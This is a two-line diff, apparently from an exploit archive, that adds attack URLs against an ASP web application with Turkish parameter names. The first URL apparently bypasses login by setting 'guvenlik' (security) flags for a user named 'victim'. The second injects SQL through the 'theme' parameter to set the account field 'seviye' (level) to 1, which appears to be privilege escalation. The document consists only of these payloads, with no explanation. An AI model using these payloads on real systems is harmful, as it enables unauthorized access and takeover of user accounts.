@@ -1,0 +1,2 @@
+http://www.example.com/mndir/enter.asp?gguvenlik=1&amp;guvenlik=1&amp;kuladi=victim&amp;password=pass
+http://www.example.com/mndir/Your_Account.asp?op=RegTheme&amp;theme=default&#039;,seviye=&#039;1
